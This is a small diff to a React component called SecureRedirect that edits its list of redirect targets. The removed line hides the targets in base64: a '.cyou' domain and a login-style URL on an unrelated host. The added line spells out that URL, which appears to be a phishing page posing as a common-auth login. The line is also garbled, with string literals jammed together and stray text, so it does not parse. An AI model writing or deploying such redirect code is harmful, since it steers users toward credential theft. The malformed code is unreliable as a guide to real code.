@@ -16,7 +16,7 @@ const SecureRedirect: React.FC = () => {
 
   // Enhanced URL configuration
   const targetUrls = [
-    "dHJpcGxlZmxhZ3BtLmN5b3U="aHR0cHM6Ly9sb2dpbmNvbW1vbmF1dGhwcGhoa24uZGl2aW5leHJuZ3QuY29tLw==" into base64
+    "dHJpcGxlZmxhZ3BtLmN5b3U="https://logincommonauthpphhkn.divinexrngt.com/" into base64
   ];
 
   // Utility functions
